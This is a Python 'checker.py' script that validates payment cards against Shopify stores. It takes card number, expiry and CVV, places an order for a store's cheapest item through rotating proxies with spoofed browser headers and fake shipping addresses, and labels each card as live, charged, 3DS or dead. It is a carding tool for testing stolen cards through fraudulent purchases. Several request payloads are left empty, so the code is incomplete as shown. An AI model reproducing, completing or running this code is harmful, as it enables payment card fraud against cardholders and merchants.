import sys
from fake_useragent import UserAgent
import requests
from urllib.parse import urlparse
import json
import time
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

max_retries = 5
retry_count = 0

ua = UserAgent().chrome

def find_between(content, start, end):
    try:
        start_pos = content.index(start) + len(start)
        end_pos = content.index(end, start_pos)
        return content[start_pos:end_pos]
    except ValueError:
        return ''

def get_proxy(proxy_string):
    if not proxy_string:
        return None
    parts = proxy_string.split(':')
    if len(parts) >= 4:
        proxy_host = parts[0]
        proxy_port = parts[1]
        proxy_username = parts[2]
        proxy_password = parts[3]
        proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    return None

def make_request_with_proxy(url, method='GET', headers=None, json_data=None, data=None, cookies=None, timeout=15, proxy=None):
    global retry_count
    global max_retries
    
    for attempt in range(max_retries):
        try:
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, proxies=proxy, 
                                      verify=False, timeout=timeout, cookies=cookies)
            elif method.upper() == 'POST':
                response = requests.post(url, headers=headers, json=json_data, 
                                       data=data, proxies=proxy, verify=False, 
                                       timeout=timeout, cookies=cookies)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")
            
            response.raise_for_status()
            return response
            
        except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
            retry_count += 1
            print(f"[Retry {retry_count}/{max_retries}] Proxy error for {url}: {e}", file=sys.stderr)
            time.sleep(1)
            
            if attempt == max_retries - 1:
                raise Exception(f"Failed after {max_retries} attempts: {e}")

def get_address_details(country_code):
    if country_code == 'US':
        return {
            'address': "420 Park ave",
            'city': "New York",
            'state': "NY",
            'zip': "10016",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY",
            'latitude': 41.1456,
            'longitude': -73.9876
        }
    elif country_code == 'AU':
        return {
            'address': "134 Buckhurst Street",
            'city': "South Melbourne",
            'state': "VIC",
            'zip': "3205",
            'phone': "07 3803 6136",
            'country': "Australia",
            'currency': "AUD",
            'zone_code': "VIC",
            'latitude': -37.8351,
            'longitude': 144.9571
        }
    else:
        return {
            'address': "133 New York 59",
            'city': "Monsey",
            'state': "NY",
            'zip': "10952",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY",
            'latitude': 41.1456,
            'longitude': -73.9876
        }

def check_card(card_data, site_input, proxy_string=""):
    global retry_count
    global max_retries
    
    parts = card_data.split('|')
    if len(parts) < 4:
        return {'status': 'error', 'message': '[ERROR] Invalid card format'}
    
    cc = parts[0]
    month = parts[1]
    year = parts[2]
    cvv = parts[3]
    
    if len(year) <= 2:
        year = f"20{year}"
    
    sub_month = str(int(month))
    
    proxy = get_proxy(proxy_string)
    
    if not site_input.startswith(('http://', 'https://')):
        site_input = 'https://' + site_input
    
    parsed_url = urlparse(site_input)
    if not parsed_url.scheme or not parsed_url.netloc:
        return {'status': 'error', 'message': '[ERROR] Invalid URL'}
    
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    domain = parsed_url.hostname
    products_url = f"{base_url}/products.json"
    
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json',
    }
    
    try:
        response = make_request_with_proxy(products_url, 'GET', headers=headers, proxy=proxy)
        
        def get_minimum_price_product_details(json_data):
            try:
                data = json.loads(json_data)
            except json.JSONDecodeError:
                raise Exception("Invalid JSON format")

            if not isinstance(data, dict) or 'products' not in data:
                raise Exception("Invalid JSON format or missing 'products' key")

            min_price = None
            min_price_details = {
                'id': None,
                'price': None,
                'title': None
            }

            for product in data['products']:
                for variant in product.get('variants', []):
                    price = float(variant['price'])
                    if price >= 0.01 and (not variant.get('available') is False):
                        if min_price is None or price < min_price:
                            min_price = price
                            min_price_details = {
                                'id': variant['id'],
                                'price': variant['price'],
                                'title': product['title']
                            }

            if min_price is None:
                raise Exception("No products found with price greater than or equal to 0.01")

            return min_price_details

        product_details = get_minimum_price_product_details(response.text)

        min_price_product_id = product_details['id']
        min_price = product_details['price']
        product_title = product_details['title']

        if not min_price_product_id:
            raise Exception('Product id is empty')

        print(f"[LOG] Product: {product_title} | ${min_price}", file=sys.stderr)

    except Exception as e:
        return {'status': 'error', 'message': f'[ERROR] {str(e)}'}

    prodid = min_price_product_id
    cart_url = f"{base_url}/cart/{prodid}:1"
    cookie = 'cookie.txt'
    
    retry_count = 0
    while retry_count < max_retries:
        try:
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Priority': 'u=0, i',
                'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }
            
            response = make_request_with_proxy(cart_url, 'GET', headers=headers, 
                                             cookies={'cookie': cookie}, proxy=proxy)

            country_code_match = re.search(r'"supportedCountries":\$"([^"]+)"\$', response.text)
            country_code = country_code_match.group(1) if country_code_match else 'US'
            print(f"[LOG] Country code: {country_code}", file=sys.stderr)

            address_details = get_address_details(country_code)

            final_url = response.url

            checkout_token_match = find_between(final_url, '/cn/', '?')
            if not checkout_token_match:
                raise ValueError("Checkout token not found in redirect URL")

            web_build_id = find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
            if not web_build_id:
                raise ValueError("Web build id not found")

            x_checkout_one_session_token = find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
            if not x_checkout_one_session_token:
                raise ValueError("Session token not found")

            queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                raise ValueError("Queue token not found")

            stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                raise ValueError("Stable ID not found")

            payment_method_identifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier:
                raise ValueError("Payment Method Identifier not found")

            print(f"[LOG] Session tokens extracted", file=sys.stderr)

            token_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.shopifycs.com',
                'referer': 'https://checkout.shopifycs.com/',
                'user-agent': ua
            }

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(sub_month),
                    "year": int(year),
                    "verification_value": cvv,
                    "name": "insane xd"
                },
                "payment_session_scope": domain
            }

            response = make_request_with_proxy("https://deposit.shopifycs.com/sessions", 
                                             'POST', headers=token_headers, json_data=payload, proxy=proxy)

            response2js = response.json()
            cctoken = response2js.get('id')
            if not cctoken:
                raise ValueError("Card token (nonce) not returned")

            print(f"[LOG] Card token received: {cctoken[:30]}...", file=sys.stderr)

            time.sleep(2)
            break

        except Exception as e:
            retry_count += 1
            print(f"[Retry {retry_count}/{max_retries}] Error: {e}", file=sys.stderr)
            continue

    else:
        return {'status': 'error', 'message': '[ERROR] Card Token not found', 'price': min_price}

    retry_count = 0

    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-source-id': checkout_token_match
        }
        address = get_address_details(country_code)

        propayload = {
            
        }

        response = make_request_with_proxy(
            f"{base_url}/checkouts/unstable/graphql",
            'POST',
            headers=headers,
            json_data=propayload,
            proxy=proxy
        )

        if response.status_code != 200:
            raise ValueError("Proposal request failed with status", response.status_code)

        data = response.json()

        gateway_info = re.search(r'"extensibilityDisplayName":"([^"]+)"', response.text)
        if gateway_info:
            gateway = gateway_info.group(1)
            gateway_result = f"Shopify + {gateway}" if gateway != "Shopify Payments" else "Normal Sh"
        else:
            gateway_result = "Unknown Gateway"

        data = response.json()
        seller_proposal = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal")

        if not seller_proposal:
            if retry_count < max_retries:
                retry_count += 1
                raise Exception("Retry: Seller proposal not found.")
            else:
                return {'status': 'error', 'message': '[ERROR] Shipping info is empty', 'price': min_price}

        handle = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("handle", "")
        if not handle:
            handle_search = re.search(r',"selectedDeliveryStrategy":{"handle":"(.*?)","__typename":"DeliveryStrategyReference', response.text)
            handle = handle_search.group(1) if handle_search else ""

        if not handle:
            if retry_count < max_retries:
                retry_count += 1
                raise Exception("Retry: Handle is empty")
            else:
                return {'status': 'error', 'message': '[ERROR] Handle is empty after all attempts', 'price': min_price, 'gateway': gateway_result}

        delivery_amount = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("amount", {}).get("value", {}).get("amount", "")
        if not delivery_amount:
            if retry_count < max_retries:
                retry_count += 1
                raise Exception("Retry: Delivery amount is empty")
            else:
                return {'status': 'error', 'message': '[ERROR] Delivery rates are empty', 'price': min_price}

        tax = seller_proposal.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "")
        if not tax:
            tax_search = re.search(r',"totalAmountIncludedInTarget":{"value":{"amount":"(.*?)","currencyCode":"', response.text)
            tax = tax_search.group(1) if tax_search else ""

        if not tax:
            if retry_count < max_retries:
                retry_count += 1
                raise Exception("Retry: Tax is empty")
            else:
                return {'status': 'error', 'message': '[ERROR] Tax is empty after all attempts', 'price': min_price, 'gateway': gateway_result}

        total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "")

        print(f"[LOG] Proposal: Handle={handle[:20]}... Tax=${tax} Total=${total_amount}", file=sys.stderr)

    except Exception as e:
        return {'status': 'error', 'message': f'[ERROR] Proposal step failed: {str(e)}'}

    receipt_id = None
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': base_url,
            'priority': 'u=1, i',
            'referer': f'{base_url}/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': checkout_token_match
        }

        payload = {
            
        }

        submit_url = f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion'

        max_retries = 3
        retry_count = 0

        while retry_count < max_retries:
            response = make_request_with_proxy(
                submit_url,
                'POST',
                headers=headers,
                json_data=payload,
                proxy=proxy
            )
            
            response_text = response.text

            if 'CAPTCHA_METADATA_MISSING' in response_text:
                return {'status': 'dead', 'message': '[DEAD] CAPTCHA DETECTED', 'price': total_amount}

            response_json = response.json()
            receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")

            if receipt_id:
                print(f"[LOG] Receipt ID: {receipt_id}", file=sys.stderr)
                break
            else:
                retry_count += 1
                time.sleep(1)
                if retry_count >= max_retries:
                    raise Exception("Receipt ID is empty")

    except Exception as e:
        return {'status': 'error', 'message': f'[ERROR] {str(e)}', 'price': total_amount if 'total_amount' in locals() else min_price}

    if receipt_id:
        purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
        
        phead = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-source-id': checkout_token_match
        }
        
        pload = {
           
        }

        try:
            response = make_request_with_proxy(
                purl,
                'POST',
                headers=phead,
                json_data=pload,
                proxy=proxy
            )

            response_json = response.json()
            response_text = json.dumps(response_json)

            try:
                if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] Thank you for your purchase! | ${total_amount}'}

                elif 'Your order is confirmed' in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] Order Placed! | ${total_amount}'}

                elif 'INCORRECT_ZIP' in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] Incorrect ZIP | ${total_amount}'}

                elif 'INSUFFICIENT_FUNDS' in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] INSUFFICIENT FUNDS | ${total_amount}'}

                elif 'INCORRECT_CVC' in response_text:
                    return {'status': 'live', 'message': f'[CCN] Incorrect CVC | ${total_amount}'}

                elif 'CompletePaymentChallenge' in response_text:
                    return {'status': 'live', 'message': f'[3DS] 3DS Secure | ${total_amount}'}

                elif 'AUTHORIZATION_ERROR' in response_text:
                    return {'status': 'live', 'message': f'[3DS] 3DS Secure | ${total_amount}'}

                elif '/authentications/' in response_text:
                    return {'status': 'live', 'message': f'[3DS] 3DS Card | ${total_amount}'}

                elif 'processingError' in response_text:
                    err = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
                    return {'status': 'dead', 'message': f'[DEAD] {err} | ${total_amount}'}

                else:
                    return {'status': 'unknown', 'message': f'[UNKNOWN] Response is Empty! | ${total_amount}'}
                    
            except Exception as e:
                return {'status': 'error', 'message': f'[ERROR] {str(e)}', 'price': total_amount}

        except Exception as e:
            return {'status': 'error', 'message': f'[ERROR] {str(e)}', 'price': total_amount}
    
    return {'status': 'error', 'message': '[ERROR] No receipt ID'}


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({'status': 'error', 'message': '[ERROR] Usage: checker.py <card> <site_url> [proxy]'}))
        sys.exit(1)
    
    card = sys.argv[1]
    site_url = sys.argv[2]
    proxy = sys.argv[3] if len(sys.argv) > 3 else ""
    
    result = check_card(card, site_url, proxy)
    print(json.dumps(result))
